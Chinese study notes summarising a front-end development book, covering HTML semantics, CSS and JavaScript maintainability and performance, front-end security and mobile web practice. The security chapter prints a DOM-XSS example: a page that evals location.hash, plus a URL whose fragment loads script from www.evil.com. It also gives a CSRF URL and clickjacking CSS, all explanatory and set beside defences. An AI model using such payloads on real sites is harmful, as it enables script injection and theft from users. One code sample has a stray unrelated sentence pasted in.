#### **ch1 前端概述**

* 概述

```js
从前端UI到后端的数据交互都属于前端开发的范畴
在页面上留下后端调用的“钩子”

兼具艺术气息和逻辑思维    
页面美感 + 操作体验 + 代码质量

// 技能
HTML 入门容易 重点在于语义与结构
CSS 组合和继承 表现有关，所以是核心之一
编程，主要是JS

// 跨平台跨浏览器
移动设备  -> 尺寸 + 性能
IE7、8的兼容，H5的新特性兼容（优雅降级）
使用IE特有的条件表达式
html5shim框架

// 合理使用前端框架
jQuery,YUI,Ext JS，prototype,...
Modernizr.underscore.backbone,rapheal...
注意框架的使用方法和编码方式

// 调试工具
JS的执行 + HTML结构变化 + CSS渲染效果

HTTP请求及返回数据
模拟发起HTTP请求并查看后端返回数据

可用插件：Fiddler(HTTP请求监控和模拟)等

// 沟通能力
 UI设计师 (效果实现和代价)
 后端工程师(交互接口和传输的数据实体的结构)
```

* 国内浏览器

```js
搜狗浏览器 
360安全浏览器
```

* 网站重构

```js
// 建议
先易后难(命名格式->模块化）
持续测试（不要大量重构后测试）

// 问题
代码组织混乱 CSS，JS，HTML掺杂
布局随意(例用<br>增距)
HTML代码不符合标准(废弃元素 marquee 因为可以用JS实现)

性能：没有缓存，动态加载，脚本压缩，图片压缩。。。

// 措施
删除无用代码：不断查看上下文
即使一些误删导致了bug也是值得的

代码规范化，缩小作用域
整理基础类库 例EXT JS和Jquery的重复

模块化 
命名空间
公共方法独立
面向对象，共有私有接口

提高加载性能
CSS Sprite，合并首页背景图
延长静态资源缓存时间
```

* W3C指定的标准

```js
structure HTML4.01
presentation CSS2
behavior ECMA DOM
```

* 安全性-&gt; 富客户端

```js
跨站点攻击
Cookie劫持
伪造恶意代码
因此需要做必要的安全校验和编码
```

#### **ch2 高效开发**

* 常用的文件组织结构

```js
--js
    --lib
    --custom.js
--css
    --lib
    --images(样式中的背景图)
    --reset.css
    --custom.js 
--resource
--index.html

// 文件命名
jquery-1.8.2.min.js
bootstrap-responsive.css
```

* 合并代码文件

```js
YUI Compresser -> Java
Web Optimization -> .NET
```

#### **ch3 标准HTML**

```js
<noscript>不能用的提示信息</noscript>
<noscript><meta url=""/></noscript>

// meta
name  http-equiv content charset
name + content 描述网站信息
http-equiv + content 设置特定的http指令

自定义/注册meta
```

#### **ch4 HTML - 高可读性**

* 分隔符不是网页内容的一部分，应该从html中分离，使用css实现 P54
* [清除浮动](http://www.cnblogs.com/dolphinX/p/3508869.html)时不要有多余的div，也应该写在css P57

```js
 <style>
      .reader li {
          text-indent: -9999px; /* 隐藏说明文字 */
      }

      .sidebar { float: left; width: 150px; }
      .content { float: right; width: 450px; }
      .clear { clear: both;}

      .clearfix {  *zoom: 1;}
      .clearfix:before,
      .clearfix:after {
          display: table;
          content: "";
      }
      .clearfix:after {
          clear: both;
      }

  </style>

<ul class="reader">
  <li class="reader-lib">lib</li>
  <li class="reader-hi spliter">hi</li>
  <li class="reader-hello spliter">you</li>
  <li class="reader-you">you</li>
</ul> 

<section>
    <div class="sidebar">side bar</div>
    <div class="content">content</div>
    <div class="clear"></div>
</section>

<section class="main clearfix">
    <div>side bar</div>
    <div>content</div>
</section>
```

* 不要用br,css实现
* 背景图css实现, 语义内容img标签
* text-indent: -999px; //用于说明性的空标签
* 设置网页标题层级
  * hgroup
  * html编辑器可能会打乱层级
  * 一个h1
  * 不要跳级，必要时可以选择hide
  * hx不为了样式
* 设计表单
  * table太臃肿
  * fieldset legend 分组
  * tab顺序 tabindex
* 精简html代码
  * 删除div span等无用的容器
* 过时的块状元素和行内元素
* html5元素分类
  * 元数据 link meta base...
  * 流式 span div 
  * 章式 article nav aside
  * 标题 h6 hgroup
  * 段落 img span 
  * 嵌入 iframe svg
  * 交互  a button input select

#### **ch5 积极拥抱HTML5**

```js
记在HTML5基础
```

#### **ch6 CSS - 高维护性**

* css分为通用类和业务类，参考结构如下

```js
css/
    lib/
    reader/
        reader.header.css
        reader.content.css
        reader.footer.css
        reader.action.css // 操作类
    common.css
    default.css
    ie-style.css // 单独写
```

* less sass 
* reset.css
  * 方案
    * `* {margin: 0; padding: 0;}` // 不推荐
    * Eric Meyer的reset
    * YUI Reset CSS
    * 思路
    * h5的新标签 display:block;
      * padding margin border
  * 类似em，重置，只要语义
  * 其他元素 table ul li a:link的text-decoration
* 给CSS排序
  * 分类 Andy Ford
    * Display&Flow 
    * Positioning
    * Dimensions
    * Margin padding borders outline
    * Typographic Style
    * Backgrounds
    * Other:opacity ,cursors ,Generated Conetent
  * 写完后排序 CSScomb
* CSS权重
  * id &gt; 类/伪类/属性选择 &gt; 标签选择/伪对象 &gt; 通配符
  * 由此 计算权重。。。
  * 使用建议
    * 不要用id选择器
    * 减少层级
      * sass使用的时候小心
    * 多组合少继承
* 兼容ie hack代码
  * 可以在根元素上

```js
    <! --[if IE7]> <html class="ie7"><! [endif]-->
```

* em px %
  * 使用em设置字体 -&gt; gem
  * 使用百分比设置尺寸

#### **ch7 CSS - 高性能**

* CSS选择器 **从右到左** 匹配
  * 最右边的是关键选择器
  * 避免使用标签选择器或单个选择器
    * .ref p.list div 
    * .ref p.list \[data-link="\#red"\]
* 避免使用 \* { }
* 避免id前加标签，因为id是唯一的
  * div\#page\_index
* 不要在选择符中定义太多层级
* 测试CSS开销的网站 [CSS selectors Test](http://stevesouders.com/efws/css-selectors/tests.php)
* id选择器最快但不易重用
* css图片处理
  * 针对原始图片独立做一台缩略图
  * CSS Sprite（雪碧图） 合并成大图再定位
    * 有利于网站风格变更，因为它们放在一起 
    * 但性能 维护 与开发需要注意
    * 开发后期
    * 图片大小在`200kb`以内传输时间差不多
    * 上下至少预留14px,左右16px的边距
    * 背景图放在有关图最右侧
    * 借助工具
      * 合并上传的多图 -&gt; CSS Sprite Generator 
      * 根据选中区域生成CSS -&gt; Sprite Cow
      * 分析网站来生成CSS和雪碧图 -&gt; SpriteMe
* 减少代码量
  * 合并规则: font-size, font-style, font-family...
  * 简介属性值

```js
    p.reader-title {
        color: #F3E;
        font-size: .8em;
        padding: 0;
    }
```

* 共同声名重复的，单独定义特殊的 

```js
    a,
    b {
    }
    a {}
    b {}
```

* 继承，归并到父类
* chrome自带工具来查找无用样式
  * 内边距设为负值
  * 拼写错误
  * 但注意其他浏览器的兼容前缀等
    * 不使用@import -&gt; 阻止并行下载
    * 避免使用IE浏览器的图片滤镜和CSS表达式
* 用JS取代

#### **ch8 CSS3最佳实践**

* 查看CSS3兼容情况
  * caniuse.com
  * CSS3 Click Chart （推荐）
  * [CSS contents and browser compatibility](http://www.quirksmode.org/css/contents.html)
* 添加浏览器前缀
  * 在线： Prefixr
  * 灵活度更高 -&gt; Autoprefixer 有sublime插件
  * cssFx, CSS Agent, -prefix-tree
  * sass, less 的模板功能
  * 但不要过度添加前缀，例-ms-border-radius
  * 标准定义放在最后，反正会覆盖到
* 优雅降级或兼容处理
  * 渐变背景色 -&gt; 单一背景色
  * IE的filter样式
  * JS实现，例框架Modernizr
* HTML5建议网站 -&gt; html5please

#### **ch09 JS - 高维护性**

```js
// 避免定义全局变量或函数
把变量和方法封装到对象里
封装在局部作用域里   

// 防止代码污染
var hi = (function() {
var length = 0;
function init() {
console.log("hello");
}

function action() {

}

return {
init: init
}
}());

hi.init();

// 使用简化的编码方式 
// 不要用new
// == ===

避免使用with 多出单独的作用
避免eval


```



* * * 不要编写检测浏览器的代码
  * 取而代之的是检测浏览器是否支持某一特定功能 $.support
  * Modernizr
  * 兼容代码单独放在文件里

```js
    <! -- [if it ie 9]>
      <script src="xx.js"></script>
    <! [endif]-->
```

* use strict 
  * 不要全局启用，放函数里或放在自执行函数里
  * 在已有代码中谨慎启用严格模式 - 重构
* JSHint JSLint
* 事件处理与业务逻辑分离
* 配置数据与代码逻辑分离
* 逻辑与结构样式分离
  * 从JS中分离CSS
    * style.borderColor -&gt; style.cssText
    * style.cssText -&gt; className += “empty”
      * h5 list\[i\].classList.add\('empty'\);
  * 从JS中分离HTML
    * 从服务器端获取html
      * Jq $\(''\).load\(\);
    * 从客户端动态生成页面结构
      * h5 template标签

```js
        <script id="main_info" type="text/x-tmpl">
          <li><b>${name}<b> (${class})</li>
        </script>  

        var infoTmpl = document.getElementById('main_info').innerHTML();
```

* JS模板的使用
  * Mustache Logic-less 易被集成
  * Handlebars 支持预编译
  * underscore
  * 其他： Jade EJS Micro-Templating
  * 网站 Template-engine-chooser
  * 不要在模板中滥用逻辑块
  * 不要构建太复杂的模板
  * 使用预编译模板
    * Grunt预先把Handlebars
* 使用MVC模式
  * Angular Meteor Ember Knockout Backbone
  * 双向绑定 模板 路由 可观察对象
  * TodoMVC项目
* JS模块化开发
  * CommonJS 同步 node.js 服务器端
  * **AMD** 异步 有网络延迟的浏览器
    * requireJS 管理前端代码模块
    * curl 
    * jquery也可支持

```js
        // 防污染
        var module = (function($, mudule2) {
          // code
        })(jQuery, module2);

        // 让jq支持AMD
        if( typeof mudule === "object"
            && module
            && typeof module.exports === "") {
          module.exports = jQuery;
        } else {
          window.jQuery = window.$ = jQuery;
          if(typeof define === "function" && define.end ) {
            define("jQuery", [], function() { return jQuery; });
          }
        }
```

* 合理使用AJAX技术
  * 明确ajax的使用场景
    * 有些跳转页面即可
    * ajax会破坏浏览器回退按钮 - jquery-hashchange
  * 借助成熟的ajax框架，但不要忘记原生方法
    * jQuery, Dojo， YUI， ExtJS
  * 做好用户交互
    * 进行ajax时给用户反馈
    * 防止用户重复操作 禁用按钮
    * 时间限制，超时终止
  * 使用JSON
  * 使用合适的方案，弥补ajax的不足

#### **ch10 JS - 高性能**

* JS加载
  * 模块加载框架 HeadJS RequireJS LABjs
  * defer\(JS代码不会产生页面内容\) 和 async\(不受限于顺序\)
  * 不优雅的方式，动态创建JS元素

```js
    var script = document.createElement("script");
    script.type = "text/javascript";
    script.src="file.js";
    document.getElementByTagName_r("head")[0].appendChild(script);
```

* 拼接字符串的三种方案
  * 不同浏览器（优化不同）执行速度不同，所以不用计较

```js
// solution 1
str += "hello" + "js";

// solution 2
str += "hello";
str += "world";针对原始图片独立做一台缩略图

// solution 3
var strArr = [];
strArr.push('str');
strArr.push("world");
str = strArr.join("");
```

* 尽管不能确认最优，但是可以知道什么是可以优化的
  * 嵌套循环时把大循环当做内循环
  * new String Number Boolean\(不推荐\) -&gt; var a = true;
  * 缓存计算结果，例如缓存浏览器滚动条宽度
* 其他性能优化
  * 少用 for in
  * clone

```js
    function clone() {
        if(null == obj || "object" != typeof obj) return obj;
        var copy = obj.constructor();
        copy.foo = obj.foo;
        copy.bar = obj.bar;
        return  copy;
    }
```

* 数组尽量不要混合多种数据类型，可以用对象
* 不要在闭包中返回外部不需要的对象
* 及时移除dom监听
* 少用全局变量
* delete 在chrome中可能妨碍性能优化
* 避免多次的跨作用查询,作用域链有关

```js
    function update() {
        var doc = document;
        var imgs = doc.getElementsByTagName("img");
        for(var i=0, len=imgs.length; i<len; i++) {
            imgs[i].title = doc.title + "- image-" + i;   
        }
    }
```

* 不推荐使用with，无形中形成作用域
* try catch, catch处理一脚外部函数

```js
          try {
          } catch(ex) {
              errorHandler(ex);
          }
```

* DOM操作
  * 重绘与重排
    * 增删和修改元素可见性
    * 页面初始化渲染
    * 移动DOM元素
    * 修改CSS样式
    * DOM元素内容改变
    * 窗口尺寸改变
    * 浏览器窗口滚动
  * 合并多次的DOM操作为单次
  * 把DOM元素离线或者隐藏后修改
    * clone DOM 到内存

```js
        var old = document.getElementById("myElement");
        var clone = old.cloneNode(true);
        old.parentNode.replaceChild(clone, old);
```

* 设置具有动画效果的DOM元素position为fixed或absolute
* 谨慎取得DOM元素的布局信息
  * 浏览器会优化连续的DOM操作
    * 使用事件托管方式绑定事件
      * 在父元素上绑定，然后判断子元素事件
    * 辅助工具 PageSpeed YSlow jsPerf
    * JavaScript性能测试库 JSLitmus

#### **ch11 JS - 高安全性**

* 国内著名的漏洞报告平台 - 乌云网
* 黑客攻击网站的主要手段有
  * SQL注入
  * 网络钓鱼
  * 跨站攻击
  * 拒绝服务攻击
* 攻击网站前端的方法
  * XSS 跨站点脚本攻击
    * 同源策略没有限制页面中加载第三方的脚本
    * 尽一切方法在目标网站上执行非目标网站上原有的脚本

```js
        <script>
            eval(location.hash.substr(1));
        </script>

        http://host/test.html#document.write("<script/src=//www.evil.com/evil.com/evil/js></script>")
```

* CSRF 跨站点请求伪造 请求来源于其他网站

```js
    http:www.a,com/del?id=21
```

* 界面操作劫持
  * 点击劫持
  * 拖放劫持
  * eg. 可见输入框内覆盖一个不可见的框

```js
        filter: alpha(opacity=0);
        opacity: 0;
        z-index: 100
```

* 不要轻易相信任何外部传入的数据
  * 不要轻易信任用户输入的数据 -&gt; 数据过滤
    * Jq中$\(''\).text\(\) 而非 html\(\)
    * 使用$\(''\).attr\(\) css\(\)
    * URL -&gt; encodeURL
    * jqencoder
    * setTimeout setInterval eval 这些函数都有安全隐患
  * 不要轻易信任任何传入的第三方数据
    * JSONP 一定要检查从第三方返回的数据格式
  * 不要仅靠JS来阻止注入
* 其他前端安全防范实践
  * cookie 设置为httpOnly
    * XSS不能通过JS获取Cookie
    * h5的localStorage
    * SSL 启用cookie的Secure设置
  * 防止网页被其他网站内嵌为iframe
    * JS阻止

```js
        <style id="antiClickjack">body{display:none !important; }<style>

        <script>
        if(self === top) {
            var antiClickjack = document.getElementById('antiClickjack');
            antiClickjack.parentNode.removeChild(antiClickjack);
        } else {
            top.location = self.location;
        }
        </script>
        // 首先设置不可见
        // 如果没有被内嵌移除不可见样式
        // 否则把顶层页面的地址设置成内嵌页面的地址
```

* X-Frame-Options响应头
  * DENY
  * SAMEORIGIN 
  * ALLOWFROM URI ?? 允许特定域

#### **ch12 移动Web前端**

* 以webkit为核心的浏览器占主导
  * 兼容 - 就放心了
  * 浏览器是移动Web网页的载体
* 移动与PC的差异
  * 显示
    * viewport
    * 虚拟键盘遮挡
  * 操作
    * 移动端的多点操作 
      * touchstart touchmove touchend **touchcancel**
    * rodio checkbox link 易误操作
    * hover已死 用active代替
  * 带宽
* 桌面Web页面兼容移动设备
  * 用户体验最佳 -&gt; 专门开发移动端网站
  * 成本角度 -&gt; 一个网站兼容所有设备
    * flow布局 // 使用百分比 权重布局
    * CSS Media queries // 媒体查询
      * link里的media
      * @media\(max-width: 600px\)
      * [相关网站](http://cssmediaqueries.com/)
    * 图片 
      * max-width: 100%; 
      * img的srcset属性 不同场景不同的加载需求 eg Retina
      * h5提议的picture标签着落。。。
      * 目前较好： picturefill JS库
    * meta里设置viewport

```js
        <meta name="viewport" content="width=device-width, initial-scale=1">
```

* widgets 长宽最少 48px
* 响应式框架
  * Foundation
  * Skeleton
  * bootstrap
* 检查兼容性
  * MobiReady
  * W3C mobileOK Checker
  * ipadPeek 输入测试网址
  * Google Howtogomo 截屏 + 建议
    * 单独开发移动端站点的准备工作
    * 确认支持的设备
    * 处理和桌面端网站的交互
* 如果在移动端输入PC端网址自动跳转 User-Agent
* JS实现
  * isMobile
  * mobile-detect （PHP）
    * 设计单页模式，避免跳转
    * 选择合适的前端框架
* **jQuery Mobile** 上手容易
* Sencha Touch 
  * Sencha Ext JS
* Kendo UI
  * 强大的web控件厂商telerik
* Ionic
  * 基于node.js
  * 深度集成Angular
    * 有选择地使用其中部分的模块
    * 最小限度地减少所使用的框架的大小
    * 调试
* Chrome自带的模拟
* Chrome远程调试
  * 移动端HTML + CSS +JS的最佳实践
  * head中添加必要的meta或link
* viewport
* format-detection // 自动识别电话号码
  * 使用mailto连接, 快速打电话发短信

```js
    <a href="tel:1-406-666-xxxx">1-406-666-xxxx</a>
```

* 不要使用iframe,慎用table
  * ul ol 来代替table
    * 或者table竖向显示
    * jQuery mobile 数据优先级
    * iframe采用超链接代替
    * 更好的方法是让第三方提供内容的API
    * XML或者JSON格式
    * 使用相对单位设置元素尺寸
    * 可点击控件设置足够大的尺寸
    * 可点击控件之间留下足够大的空间
    * 少用图片，小图片考虑icon
    * Font Awesome
    * Bootstrap Glyphicons
    * Base64格式 + Data URLs
    * 不要使用:hover设置悬停效果
    * 设置合理的字体大小\(16px\)和行高\(1.5\)
    * 在不需要选中文字区域禁用文字选中功能
    * 右键单击 -&gt; 触摸长按

```js
        -webkit-user-selector: none;
        -webkit-touch-callout: none;
```

* 触发鼠标事件滞后300毫秒（可察觉的延迟）
  * 模拟click -&gt; tap事件
  * 模拟右键 -&gt; taphold 
* 横竖屏切换禁止
  * hack方案来模拟静止横竖屏切换
  * 更推荐的方案 orientationchange或者给出提示信息
* 慎用弹出窗口，标准对话框外观不一致最好统一重写
* 慎用Timer setInterval setTimeout
  * 只有Android Chrome在浏览器转后台是任然执行JS
  * Timer完成准确控制时间任务不太靠谱



